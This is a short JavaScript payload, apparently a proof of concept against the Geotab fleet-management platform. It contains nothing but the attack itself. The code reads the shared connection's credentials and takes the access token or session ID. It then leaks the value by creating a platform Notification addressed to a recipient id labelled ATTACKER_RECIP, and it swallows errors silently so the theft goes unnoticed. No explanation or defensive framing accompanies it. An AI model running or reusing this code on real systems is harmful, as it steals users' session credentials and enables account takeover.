const ATTACKER_RECIP = 'b35';
(async () => {
  try {
    const conn = geotab.getSharedVariable('default').connection;
    const creds = await conn.getCredentials();
    const data  = creds.accessToken || creds.sessionId || JSON.stringify(creds);
    const d = conn.call('Add', { typeName: 'Notification', entity: {
      recipient:   { id: ATTACKER_RECIP },
      dateTime:    new Date().toISOString(),
      dateTimeEnd: '2099-12-31T23:59:59.999Z',
      notificationApplicationExceptionData: { source:'token', description:'token', info: data, machineName:'token' } }});
    try { await new Promise((r,j) => d.beginInvoke(r,j)); } catch (e) {}
  } catch (e) {}
})();
